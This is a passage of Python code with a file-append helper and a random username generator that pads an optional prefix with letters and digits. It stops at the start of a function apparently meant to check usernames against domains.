def save_data(file, data):
    with open(file, "a", encoding="utf-8") as f:
        f.write(data + "\n")
class Generator:
    @staticmethod
    def create_user(prefix, length):
        # Mandatory Mix: lowercase letters + digits
        chars = string.ascii_lowercase + string.digits
        # Auto-set length to 7-10 if user leaves it empty
        if not length or length == 0:
            length = random.randint(7, 10)
        
        if not prefix:
            return ''.join(random.choice(chars) for _ in range(length))
        
        if len(prefix) >= length:
            return prefix
        
        # Smart Fill: Add random letters/numbers after your prefix
        needed = length - len(prefix)
        suffix = ''.join(random.choice(chars) for _ in range(needed))
        return prefix + suffix

def hunter_engine(mode, prefix, length, domains):
